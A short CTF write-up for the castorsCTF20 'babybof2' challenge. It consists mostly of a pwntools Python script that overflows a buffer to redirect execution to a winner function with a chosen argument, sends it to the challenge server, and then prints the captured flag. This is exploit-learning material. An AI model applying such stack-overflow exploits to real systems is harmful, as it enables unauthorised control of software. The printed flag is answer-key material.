---
type: "post"
title: "babybof2"
author: "tozkoparan (Ahmed Selim Üzüm)"
tags: ["writeup", "pwn", "castorsCTF20"]
---

With same strategy as `babybof1` we can get the flag

```python
from pwn import *

winnersLevel_addr = 0x08049196
param_1 = 0x182

#p = process("./winners")
p = remote("chals20.cybercastors.com", 14434)

padding = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
payload = padding + p32(winnersLevel_addr) + "CCCC" + p32(param_1)
p.sendline(payload)
print(payload)
p.interactive()
```

**Flag:** `castorsCTF{b0F_s_4r3_V3rry_fuN_4m_l_r1ght}`



